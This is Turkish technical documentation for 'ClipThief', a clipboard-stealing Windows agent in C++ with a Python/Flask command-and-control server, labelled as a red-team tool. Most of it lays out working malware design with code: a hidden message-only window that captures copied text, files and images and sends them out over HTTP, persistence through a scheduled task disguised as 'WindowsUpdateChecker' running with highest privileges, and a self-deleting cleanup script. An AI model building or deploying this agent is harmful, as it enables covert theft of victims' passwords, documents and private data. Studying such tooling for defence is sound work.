# ClipThief — Teknik Proje Dokümantasyonu

**Yazar:** @erberkan / B3R-SEC  
**Amaç:** Red team / güvenlik araştırması  
**Mimari:** Windows Agent (C++) + Terminal C2 (Python/Flask + SQLite)

---

## İçindekiler

1. [Proje Genel Bakış](#1-proje-genel-bakış)
2. [Dizin Yapısı](#2-dizin-yapısı)
3. [Sistem Mimarisi](#3-sistem-mimarisi)
4. [Agent (C++)](#4-agent-c)
   - 4.1 [Derleme Ayarları](#41-derleme-ayarları)
   - 4.2 [Bağımlılıklar ve Kütüphaneler](#42-bağımlılıklar-ve-kütüphaneler)
   - 4.3 [Sabitler ve Global Değişkenler](#43-sabitler-ve-global-değişkenler)
   - 4.4 [UUID Üretimi](#44-uuid-üretimi)
   - 4.5 [Agent ID Kalıcılığı (Registry)](#45-agent-id-kalıcılığı-registry)
   - 4.6 [Base64 Kodlayıcı](#46-base64-kodlayıcı)
   - 4.7 [JSON Yardımcıları](#47-json-yardımcıları)
   - 4.8 [HTTP İletişimi (WinINet)](#48-http-i̇letişimi-wininet)
   - 4.9 [Sistem Bilgisi Toplama](#49-sistem-bilgisi-toplama)
   - 4.10 [Agent Kaydı](#410-agent-kaydı)
   - 4.11 [Clipboard İzleme](#411-clipboard-i̇zleme)
   - 4.12 [DIB → BMP Dönüşümü](#412-dib--bmp-dönüşümü)
   - 4.13 [Self-Destruct (Kill)](#413-self-destruct-kill)
   - 4.14 [Kalıcılık (Persist)](#414-kalıcılık-persist)
   - 4.15 [Komut Polling Thread'i](#415-komut-polling-threadi)
   - 4.16 [Mesaj Penceresi ve WndProc](#416-mesaj-penceresi-ve-wndproc)
   - 4.17 [WinMain Giriş Noktası](#417-winmain-giriş-noktası)
5. [C2 Sunucusu (Python)](#5-c2-sunucusu-python)
   - 5.1 [Bağımlılıklar](#51-bağımlılıklar)
   - 5.2 [SQLite Veritabanı](#52-sqlite-veritabanı)
   - 5.3 [REST API Endpoint'leri](#53-rest-api-endpointleri)
   - 5.4 [İn-Memory Durum Yönetimi](#54-i̇n-memory-durum-yönetimi)
   - 5.5 [Yeni Agent Bildirimi](#55-yeni-agent-bildirimi)
   - 5.6 [Terminal UI Ekranları](#56-terminal-ui-ekranları)
   - 5.7 [Veritabanı Yönetim Ekranı](#57-veritabanı-yönetim-ekranı)
   - 5.8 [Ana Döngü ve Otomatik Yönlendirme](#58-ana-döngü-ve-otomatik-yönlendirme)
6. [İletişim Protokolü](#6-i̇letişim-protokolü)
7. [Veri Akışı Diyagramı](#7-veri-akışı-diyagramı)
8. [Güvenlik Notları](#8-güvenlik-notları)

---

## 1. Proje Genel Bakış

ClipThief iki bileşenden oluşur:

| Bileşen | Dil | Dosya |
|---------|-----|-------|
| **Agent** | C++ (Win32 API) | `ClipboardDump/ClipboardDump/ClipboardDump.cpp` |
| **C2 Sunucusu** | Python 3 + Flask | `C2/c2_server.py` |

Agent, hedef Windows sistemde arka planda sessizce çalışır. Clipboard değişikliklerini (metin, resim, dosya) yakalar ve HTTP üzerinden C2'ye gönderir. C2 ise terminal tabanlı bir arayüz sunar; operatör her agent'ı izleyebilir, geçmişe bakabilir ve komut gönderebilir.

---

## 2. Dizin Yapısı

```
ClipThief/
├── ClipboardDump/
│   ├── ClipboardDump.sln               # Visual Studio solution
│   └── ClipboardDump/
│       ├── ClipboardDump.cpp           # Agent kaynak kodu (tek dosya)
│       ├── ClipboardDump.vcxproj       # MSVC proje dosyası
│       └── x64/{Debug,Release}/        # Derleme çıktıları
│
├── C2/
│   ├── c2_server.py                    # C2 sunucusu (tek dosya)
│   ├── requirements.txt                # Python bağımlılıkları
│   ├── setup_and_run.bat               # Windows başlatma scripti
│   ├── c2_data.db                      # SQLite veritabanı (otomatik oluşur)
│   └── downloads/                      # İndirilen clipboard dosyaları
│
├── PROJECT.md                          # Bu dosya (teknik dokümantasyon)
└── README.md                           # Kurulum ve kullanım kılavuzu
```

---

## 3. Sistem Mimarisi

```
┌─────────────────────────────┐          HTTP/JSON          ┌──────────────────────────┐
│         AGENT (C++)         │ ──────────────────────────► │     C2 SERVER (Python)   │
│                             │                             │                          │
│  WinMain (Windows subsys.)  │  POST /api/agent/register   │  Flask REST API          │
│  ├─ LoadOrCreateAgentId()   │  POST /api/agent/<id>/clip  │  ├─ SQLite (c2_data.db)  │
│  ├─ RegisterAgent()         │  GET  /api/agent/<id>/cmd   │  ├─ In-memory agents{}   │
│  ├─ AddClipboardListener()  │ ◄──────────────────────────  │  └─ Terminal UI          │
│  ├─ WndProc (message loop)  │  {"command": "kill|persist"} │                          │
│  └─ CommandPollThread()     │                             │  Operatör menüsü:        │
│                             │                             │  ├─ Agent listesi        │
│  Clipboard Formats:         │                             │  ├─ Clipboard geçmişi    │
│  ├─ CF_UNICODETEXT (text)   │                             │  ├─ Kill / Persist       │
│  ├─ CF_HDROP (files)        │                             │  └─ DB yönetimi          │
│  └─ CF_DIB (images→BMP)     │                             │                          │
└─────────────────────────────┘                             └──────────────────────────┘
         │ Registry                                                    │ c2_data.db
         │ HKCU\Software\Microsoft\...\ClipAgent                      │ agents tablo
         │ AgentID = <UUID>                                            │ clipboard_entries tablo
```

---

## 4. Agent (C++)

### 4.1 Derleme Ayarları

| Ayar | Değer |
|------|-------|
| Toolset | MSVC v143 (VS 2022) |
| Platform | x64 / Win32 |
| Subsystem | **Windows** (konsol penceresi yok) |
| Character Set | Unicode |
| Entry point | `WinMain` |

Subsystem `Windows` olduğu için EXE çalıştırıldığında hiçbir terminal penceresi açılmaz. Process, Task Manager'da görünür ama kullanıcıya herhangi bir UI sunmaz.

### 4.2 Bağımlılıklar ve Kütüphaneler

```cpp
#include <winsock2.h>   // Winsock2 — ws2_32.lib (windows.h'dan önce gelmeli)
#include <ws2tcpip.h>   // getaddrinfo, inet_ntop
#include <windows.h>    // Win32 API temel
#include <wininet.h>    // HTTP — wininet.lib
#include <shellapi.h>   // DragQueryFile (CF_HDROP) — shell32.lib
#include <rpc.h>        // UuidCreate, UuidToStringA — rpcrt4.lib
```

`#pragma comment(lib, ...)` ile linker direktifleri kaynak dosyasına gömülüdür; proje dosyasında ayrıca ayar gerekmez.

> **Neden `objbase.h` değil, `rpc.h`?**  
> `WIN32_LEAN_AND_MEAN` tanımlı olduğunda `windows.h`, OLE/COM başlıklarını (`objbase.h`) dışarıda bırakır. Bu yüzden `CoCreateGuid` derleme hatası verir. RPC kütüphanesi bu makrodan etkilenmez; `UuidCreate` ile aynı işlev bağımlılık olmadan sağlanır.

### 4.3 Sabitler ve Global Değişkenler

```cpp
static const char* C2_HOST   = "127.0.0.1";    // C2 sunucu adresi
static const int   C2_PORT   = 5000;            // C2 sunucu portu
static const int   POLL_MS   = 3000;            // Komut polling aralığı (ms)
static const char* REG_PATH  = "Software\\Microsoft\\Windows\\CurrentVersion\\ClipAgent";
static const char* TASK_NAME = "WindowsUpdateChecker"; // Scheduled task adı
static const size_t MAX_FILE = 50 * 1024 * 1024;       // Dosya yükleme limiti (50MB)

static std::string   g_agentId;        // Kalıcı unique ID
static HWND          g_hwnd = NULL;    // Message-only pencere handle'ı
static volatile bool g_running = true; // Thread sonlandırma bayrağı
```

Hedef sisteme deploy edilmeden önce `C2_HOST` ve `C2_PORT` değerleri güncellenmeli.

### 4.4 UUID Üretimi

```cpp
static std::string GenerateUUID()
{
    UUID uuid = {};
    UuidCreate(&uuid);              // Sistem entropisinden kriptografik UUID

    RPC_CSTR rpcStr = nullptr;
    UuidToStringA(&uuid, &rpcStr);  // "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" formatı
    std::string result(reinterpret_cast<char*>(rpcStr));
    RpcStringFreeA(&rpcStr);        // RPC heap'ten serbest bırak
    return result;
}
```

`UuidCreate`, Windows'un kriptografik RNG'sini kullanır. Üretilen UUID standart RFC 4122 formatındadır.

### 4.5 Agent ID Kalıcılığı (Registry)

```cpp
static std::string LoadOrCreateAgentId()
{
    // 1. Registry'den oku
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        // AgentID değeri varsa döndür
    }

    // 2. Yoksa yeni UUID üret ve kaydet
    std::string id = GenerateUUID();
    RegCreateKeyExA(HKEY_CURRENT_USER, REG_PATH, ...);
    RegSetValueExA(hKey, "AgentID", 0, REG_SZ, ...);
    return id;
}
```

**Neden HKCU?** `HKEY_LOCAL_MACHINE` yazımı için yönetici yetkisi gerekir. `HKEY_CURRENT_USER` standart kullanıcıyla erişilebilir.

Registry yolu: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ClipAgent`  
Değer adı: `AgentID` (REG_SZ)

Agent her yeniden başlatıldığında aynı ID'yi okur; C2 tarafında aynı agent olarak tanınır.

### 4.6 Base64 Kodlayıcı

Harici kütüphane kullanmadan sıfırdan yazılmış, standart Base64 (RFC 4648) implementasyonu.

```cpp
static const char B64_TABLE[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string Base64Encode(const BYTE* data, size_t len)
{
    // Her 3 byte'ı 4 karakter olarak kodlar
    // Eksik byte'lar için '=' padding eklenir
}
```

Üç wrapper fonksiyon:
- `Base64Encode(const BYTE*, size_t)` — ham byte dizisi
- `Base64EncodeVec(const vector<BYTE>&)` — vector wrapper
- `Base64EncodeStr(const string&)` — string wrapper (metin clipboard için)

### 4.7 JSON Yardımcıları

Harici JSON kütüphanesi kullanmadan iki yardımcı fonksiyon:

```cpp
// Özel karakterleri escape eder: " \ \n \r \t
static std::string JsonEscape(const std::string& s);

// JSON yanıtından string değer çeker: "key":"value"
static std::string JsonGetString(const std::string& json, const std::string& key);
```

`JsonGetString`, komut polling yanıtını (`{"command":"kill"}`) parse etmek için kullanılır.

### 4.8 HTTP İletişimi (WinINet)

`URLOpenBlockingStreamA` (orijinal kodda vardı, deprecated ve kaynak sızıntısına neden oluyordu) yerine `WinINet` API'si kullanılır.

**HttpPost:**
```
InternetOpenA()          → HINTERNET oturumu aç
  └─ InternetConnectA()  → Host:Port bağlantısı
       └─ HttpOpenRequestA("POST", path)
            └─ HttpSendRequestA(headers, json_body)
                 └─ InternetReadFile() döngüsü → yanıt oku
                      └─ Her handle CloseHandle ile kapatılır
```

**HttpGet:** Aynı yapı, body yerine sadece GET isteği.

Her handle ayrı ayrı `InternetCloseHandle` ile kapatılır. Hata durumunda erken çıkış yollarında da temizlik garantilenir.

### 4.9 Sistem Bilgisi Toplama

| Fonksiyon | Win32 API | Döndürdüğü |
|-----------|-----------|------------|
| `GetUsername()` | `GetUserNameA` | Oturum açmış kullanıcı adı |
| `GetHostname()` | `GetComputerNameA` | NetBIOS makine adı |
| `GetLocalIP()` | `gethostname` + `getaddrinfo` | IPv4 adresi |
| `GetOSVersion()` | `RtlGetVersion` (ntdll.dll) | "Windows 10.0 Build 19045" |

**Neden `RtlGetVersion`?**  
`GetVersionEx` Windows 8.1'den itibaren uygulama uyumluluk shim'leri nedeniyle gerçek versiyon yerine manifesto versiyonunu döndürebilir. `RtlGetVersion`, kernel seviyesinde çalışır ve her zaman gerçek build numarasını verir.

```cpp
typedef LONG(WINAPI* RtlGetVersionFn)(RTL_OSVERSIONINFOW*);
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
auto fn = (RtlGetVersionFn)GetProcAddress(ntdll, "RtlGetVersion");
```

### 4.10 Agent Kaydı

```cpp
static void RegisterAgent()
{
    // Sistem bilgilerini topla
    // JSON body oluştur:
    // {"id":"...","user":"...","hostname":"...","ip":"...","os":"..."}
    // POST /api/agent/register
}
```

Agent ilk başlatıldığında bu fonksiyon çağrılır. C2 erişilebilir değilse `HttpPost` sessizce `false` döndürür; agent çalışmaya devam eder.

### 4.11 Clipboard İzleme

`AddClipboardFormatListener(hwnd)` ile Windows mesaj sistemine kayıt olunur. Her clipboard değişiminde `WM_CLIPBOARDUPDATE` mesajı gelir.

**Format öncelik sırası:**

```
WM_CLIPBOARDUPDATE geldi
│
├─ CF_UNICODETEXT var mı?
│   ├─ Evet → GlobalLock → UTF-16 → UTF-8 dönüşüm → Base64 → POST (text)
│   └─ return (diğer formatlara bakma)
│
├─ CF_HDROP var mı? (dosya kopyalama)
│   ├─ Evet → DragQueryFile ile dosya yollarını al (max 5)
│   │          Her dosyayı oku (max 50MB) → Base64 → POST (file)
│   └─ return
│
└─ CF_DIB var mı? (screenshot veya resim kopyalama)
    ├─ Evet → DibToBmp() → BMP bytes → Base64 → POST (image)
    └─ return
```

**CF_UNICODETEXT neden CF_TEXT yerine?**  
`CF_TEXT` ANSI'dir ve Türkçe/Arapça/Çince gibi çok baytlı karakterleri bozar. `CF_UNICODETEXT` UTF-16 içerir; `WideCharToMultiByte(CP_UTF8)` ile kayıpsız UTF-8'e çevrilir.

**GlobalLock/GlobalUnlock dengesi:**  
Orijinal kodda `GlobalUnlock` eksikti (Windows kaynak sızıntısı). Her `GlobalLock` çağrısı, karşılık gelen `GlobalUnlock` ile tamamlanır.

### 4.12 DIB → BMP Dönüşümü

Clipboard'daki `CF_DIB` verisi `BITMAPINFOHEADER + renk tablosu + piksel verisi` içerir. Geçerli bir `.bmp` dosyası için başına `BITMAPFILEHEADER` eklemek yeterlidir.

```cpp
static std::vector<BYTE> DibToBmp(HGLOBAL hGlobal)
{
    // 1. GlobalSize ile veri boyutunu al
    // 2. GlobalLock ile pointer al
    // 3. BITMAPINFOHEADER'dan renk tablosu boyutunu hesapla
    //    (8-bit ve altı indexed bitmap'ler için gerekli)
    // 4. BITMAPFILEHEADER'ı hesapla:
    //    bfOffBits = sizeof(BITMAPFILEHEADER) + bih->biSize + colorTableSize
    //    bfSize = sizeof(BITMAPFILEHEADER) + dataSize
    // 5. Header + veriyi tek buffer'da birleştir
    // 6. GlobalUnlock
}
```

GDI+, libpng veya başka harici kütüphane kullanılmaz. Üretilen dosya standart BMP formatıdır.

### 4.13 Self-Destruct (Kill)

```cpp
static void SelfDestruct()
{
    // 1. Registry'den AgentID sil
    RegDeleteKeyA(HKEY_CURRENT_USER, REG_PATH);

    // 2. Kendi EXE yolunu al
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // 3. %TEMP%\cleanup_<PID>.bat oluştur:
    //    ping 127.0.0.1 -n 4 >nul   (process çıkana kadar bekle)
    //    del /f /q "<exePath>"
    //    del /f /q "%~f0"           (batch dosyası da kendini siler)

    // 4. Batch'i gizli çalıştır
    ShellExecuteA(NULL, "open", batPath, NULL, NULL, SW_HIDE);

    // 5. Process'i sonlandır
    g_running = false;
    PostMessage(g_hwnd, WM_QUIT, 0, 0);
    ExitProcess(0);
}
```

Process çıktıktan ~3 saniye sonra batch dosyası EXE'yi ve kendini siler.

### 4.14 Kalıcılık (Persist)

```cpp
static void AddPersistence()
{
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // schtasks /create
    //   /tn "WindowsUpdateChecker"
    //   /tr "\"<exePath>\""
    //   /sc onlogon          → Her oturum açmada çalış
    //   /rl highest          → En yüksek yetkiyle çalış
    //   /f                   → Varsa üzerine yaz

    CreateProcessA(..., "cmd.exe /c schtasks ...", CREATE_NO_WINDOW, ...);
    WaitForSingleObject(pi.hProcess, 5000);
}
```

`/sc onlogon` ile kullanıcı her oturum açtığında agent otomatik başlar.  
`/rl highest` UAC prompt olmadan elevated çalışmayı dener.

### 4.15 Komut Polling Thread'i

```cpp
static DWORD WINAPI CommandPollThread(LPVOID)
{
    std::string path = "/api/agent/" + g_agentId + "/command";
    while (g_running) {
        Sleep(POLL_MS);   // 3 saniye bekle
        std::string resp;
        if (HttpGet(path, resp)) {
            std::string cmd = JsonGetString(resp, "command");
            if (cmd == "kill")    SelfDestruct();   // geri dönmez
            if (cmd == "persist") AddPersistence();
        }
    }
    return 0;
}
```

C2 komut göndermediğinde `{"command":"none"}` yanıtı gelir; agent bunu yok sayar. Komut C2'de kuyruğa alınır, polling sırasında bir kez teslim edilir ve C2'den silinir (`pending_cmds.pop`).

### 4.16 Mesaj Penceresi ve WndProc

```cpp
// HWND_MESSAGE: görünmez message-only pencere
g_hwnd = CreateWindowExW(0, L"ClipThiefWnd", L"", 0,
                          0, 0, 0, 0,
                          HWND_MESSAGE,   // ← Ekranda görünmez
                          NULL, hInstance, NULL);
AddClipboardFormatListener(g_hwnd);
```

`HWND_MESSAGE` penceresi:
- Ekranda görünmez
- Alt+Tab listesinde çıkmaz
- Sadece mesaj alabilir

```cpp
static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg) {
    case WM_CLIPBOARDUPDATE: HandleClipboardUpdate(); return 0;
    case WM_DESTROY:         PostQuitMessage(0);      return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}
```

### 4.17 WinMain Giriş Noktası

```cpp
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int)
{
    WSAStartup(MAKEWORD(2, 2), &wsa);   // Winsock başlat
    g_agentId = LoadOrCreateAgentId();  // ID yükle/oluştur
    RegisterAgent();                     // C2'ye kayıt ol

    // Message-only pencere oluştur
    RegisterClassW(&wc);
    CreateWindowExW(..., HWND_MESSAGE, ...);
    AddClipboardFormatListener(g_hwnd);

    // Komut polling thread'ini başlat
    CreateThread(NULL, 0, CommandPollThread, NULL, 0, NULL);

    // Mesaj döngüsü (clipboard olaylarını işler)
    while (g_running) {
        GetMessageW(&msg, NULL, 0, 0);
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    // Temizlik
    RemoveClipboardFormatListener(g_hwnd);
    WaitForSingleObject(hThread, 2000);
    WSACleanup();
}
```

`WinMain` + `SubSystem=Windows` kombinasyonu konsol penceresi açılmasını engeller.

---

## 5. C2 Sunucusu (Python)

### 5.1 Bağımlılıklar

```
flask>=3.0.0    # HTTP sunucu
rich>=13.0.0    # Opsiyonel, gelecek UI iyileştirmeleri için
sqlite3         # Python standart kütüphane (kurulum gerektirmez)
```

### 5.2 SQLite Veritabanı

**Dosya:** `C2/c2_data.db`  
**WAL modu:** Eş zamanlı Flask thread okuma/yazma güvenli.

**Şema:**

```sql
CREATE TABLE agents (
    id         TEXT PRIMARY KEY,   -- UUID
    user       TEXT,               -- Windows kullanıcı adı
    hostname   TEXT,               -- NetBIOS makine adı
    ip         TEXT,               -- IPv4 adresi
    os         TEXT,               -- "Windows 10.0 Build 19045"
    first_seen TEXT,               -- İlk bağlantı zamanı
    last_seen  TEXT,               -- Son aktivite
    status     TEXT                -- "active"
);

CREATE TABLE clipboard_entries (
    rowid      INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id   TEXT NOT NULL,      -- agents.id FK
    seq        INTEGER NOT NULL,   -- Agent başına sıra numarası
    type       TEXT NOT NULL,      -- "text" | "image" | "file"
    content    TEXT NOT NULL,      -- Base64 kodlu içerik
    filename   TEXT,               -- Dosya/resim için orijinal isim
    timestamp  TEXT NOT NULL,      -- "2026-04-21 14:32:11"
    FOREIGN KEY(agent_id) REFERENCES agents(id)
);
```

**Yardımcı fonksiyonlar:**

| Fonksiyon | İşlev |
|-----------|-------|
| `db_connect()` | WAL modlu SQLite bağlantısı açar |
| `db_init()` | Tabloları oluşturur, agents'ı belleğe yükler |
| `db_upsert_agent(info)` | `INSERT ... ON CONFLICT DO UPDATE` ile agent kaydeder/günceller |
| `db_insert_clip(...)` | Yeni clipboard kaydı ekler |
| `db_get_clips(agent_id)` | Agent'ın tüm clipboard geçmişini döndürür |
| `db_next_seq(agent_id)` | `MAX(seq)+1` ile sonraki sıra numarasını hesaplar |
| `db_clear_all()` | Her iki tabloyu tamamen temizler |
| `db_clear_agent(agent_id)` | Belirli bir agent ve clipboard'larını siler |

### 5.3 REST API Endpoint'leri

#### `POST /api/agent/register`

Agent ilk çalıştığında veya yeniden başladığında çağrılır.

**Request:**
```json
{
  "id":       "a1b2c3d4-e5f6-...",
  "user":     "erberkan",
  "hostname": "DESKTOP-ABC123",
  "ip":       "192.168.1.50",
  "os":       "Windows 10.0 Build 19045"
}
```

**Response:** `{"status": "ok"}`

**Davranış:**
- Yeni agent → `agents` dict'e ekle, DB'ye yaz, `new_agent_queue`'ya ekle, bildirim kutusu yazdır
- Mevcut agent → `last_seen` güncelle, yeniden bağlantı bildirimi yazdır

#### `POST /api/agent/<id>/clipboard`

Her clipboard değişiminde çağrılır.

**Request:**
```json
{
  "type":     "text",
  "content":  "<base64>",
  "filename": ""
}
```

`type` değerleri: `"text"` | `"image"` | `"file"`  
`filename`: Metin için boş, dosya/resim için orijinal dosya adı.

**Response:** `{"status": "ok"}`

#### `GET /api/agent/<id>/command`

Agent her 3 saniyede bu endpoint'i sorgular.

**Response:**
```json
{"command": "none"}
{"command": "kill"}
{"command": "persist"}
```

Komut bir kez teslim edilir ve `pending_cmds` dict'ten silinir.

### 5.4 İn-Memory Durum Yönetimi

```python
agents: dict       = {}   # Hızlı erişim için DB'nin bellek kopyası
pending_cmds: dict = {}   # agent_id -> "kill" | "persist"
db_lock            = threading.Lock()   # agents + pending_cmds erişim kilidi
new_agent_queue    = queue.Queue()      # Flask → UI thread haberleşmesi
```

Tüm DB işlemleri `db_lock` altında yapılır. Flask thread'leri ve UI thread'i eş zamanlı veri bozulmasına karşı korunur.

### 5.5 Yeni Agent Bildirimi

Yeni agent bağlandığında terminal'e çerçeveli kutu yazdırılır:

```
  ╔════════════════════════════════════════════════════════╗
  ║              *** NEW AGENT CONNECTED ***               ║
  ╠════════════════════════════════════════════════════════╣
  ║  ID      : a1b2c3d4-e5f6-...                          ║
  ║  User    : erberkan                                    ║
  ║  Hostname: DESKTOP-ABC123                              ║
  ║  IP      : 192.168.1.50                                ║
  ║  OS      : Windows 10.0 Build 19045                    ║
  ║  Time    : 2026-04-21 14:32:11                         ║
  ╚════════════════════════════════════════════════════════╝
  Press Enter to open agent menu...
```

`_ui_lock` ile bu yazdırma işlemi, başka thread'lerin yazmasıyla çakışmaz.

### 5.6 Terminal UI Ekranları

**Ana ekran (`screen_agent_list`):**
```
  #    ID (short)  USER             HOSTNAME             IP               LAST SEEN            STATUS
  -----------------------------------------------------------------------------------------
  1    a1b2c3d4... erberkan         DESKTOP-ABC123       192.168.1.50     2026-04-21 14:35:00  active

  [N]  Select agent by number
  [D]  Database management
  [R]  Refresh
  [Q]  Quit
```

**Agent menüsü (`screen_agent_menu`):**
```
  Agent     : a1b2c3d4-e5f6-...
  User      : erberkan
  Hostname  : DESKTOP-ABC123
  ...
  Clipboard entries: 47

  [1] View clipboard history
  [2] Send KILL command  (self-destruct + delete)
  [3] Send PERSIST command  (add scheduled task)
  [4] Delete this agent from DB
  [0] Back
```

**Clipboard geçmişi (`screen_clipboard_list`):**
```
  Clipboard — a1b2c3d...  (47 entries)

  #     TYPE   TIMESTAMP              PREVIEW / FILENAME
  -----------------------------------------------
  1     text   2026-04-21 14:32:15    SELECT * FROM users WHERE ...
  2     image  2026-04-21 14:35:01    clipboard.bmp
  3     file   2026-04-21 14:38:44    salary_report.xlsx

  <n>  view    D <n>  download    0  back
```

**Görüntüleme (`screen_view_entry`):**
- `text` → Terminal'de inline gösterir
- `image` / `file` → `downloads/` klasörüne kaydeder, OS varsayılan uygulamayla açar

### 5.7 Veritabanı Yönetim Ekranı

```
  Database : C:\...\C2\c2_data.db
  Size     : 2,048,576 bytes
  Agents   : 3
  Clipboard: 892 entries

  [1] Clear ALL data  (agents + clipboard)
  [0] Back
```

Tam temizlik için `YES` (büyük harf) yazılması zorunludur.

### 5.8 Ana Döngü ve Otomatik Yönlendirme

```python
def run_terminal_ui():
    while True:
        # Yeni agent geldi mi?
        try:
            agent_id = new_agent_queue.get_nowait()
            screen_agent_menu(agent_id)   # Direkt agent menüsüne git
            continue
        except queue.Empty:
            pass

        # Normal ana ekran
        agent_list = screen_agent_list()
        choice = input("  > ")
        ...
```

Flask thread'i yeni agent'ı `new_agent_queue`'ya koyar. UI thread `input()` bekliyorsa, kullanıcı Enter'a basınca kuyruk kontrol edilir ve agent menüsüne otomatik geçilir.

---

## 6. İletişim Protokolü

| Endpoint | Yön | Sıklık | İçerik |
|----------|-----|--------|--------|
| `POST /api/agent/register` | Agent → C2 | Başlangıçta bir kez | Sistem bilgisi JSON |
| `POST /api/agent/<id>/clipboard` | Agent → C2 | Her clipboard değişiminde | Base64 veri + tip + dosya adı |
| `GET /api/agent/<id>/command` | Agent → C2 | Her 3 saniyede | Komut sorgusu |

Tüm iletişim düz HTTP/JSON üzerinden yapılır. Veri Base64 ile kodlanır.

---

## 7. Veri Akışı Diyagramı

```
Agent Başlar
    │
    ├─► LoadOrCreateAgentId()  ──► HKCU Registry'den UUID yükle/oluştur
    │
    ├─► RegisterAgent()  ──► POST /api/agent/register
    │                              │
    │                              ▼
    │                        C2: agents{} güncelle
    │                        C2: DB'ye yaz
    │                        C2: new_agent_queue.put()
    │                        C2: Bildirim kutusu yazdır
    │
    ├─► AddClipboardFormatListener()
    │
    ├─► CommandPollThread (arka plan)
    │       │
    │       └─ Her 3s: GET /api/agent/<id>/command
    │               ├─ "kill"    → SelfDestruct()
    │               └─ "persist" → AddPersistence()
    │
    └─► Mesaj Döngüsü
            │
            └─ WM_CLIPBOARDUPDATE
                    │
                    ├─ CF_UNICODETEXT → UTF-8 → Base64 → POST (text)
                    ├─ CF_HDROP       → Dosya oku → Base64 → POST (file)
                    └─ CF_DIB         → BMP dönüştür → Base64 → POST (image)
```

---

## 8. Güvenlik Notları

Bu araç yalnızca **yetkilendirilmiş** ortamlarda (penetration testing, red team tatbikatları, güvenlik araştırması) kullanım içindir.

**Bilinen kısıtlamalar:**
- HTTP plain text — MITM'e açık (production'da HTTPS/TLS eklenebilir)
- Komut polling 3 saniyede bir — yüksek yük durumunda artırılabilir
- Dosya yükleme 50MB ile sınırlı — büyük dosyalar kırpılır
- Tek yönlü komut (sadece kill/persist) — tasarım gereği

**Temizlik:**
- `kill` komutu registry'i siler ve EXE'yi kaldırır
- Scheduled task `schtasks /delete /tn "WindowsUpdateChecker" /f` ile elle de silinebilir
- C2 DB'si `[D] → [1] → YES` ile tamamen temizlenebilir
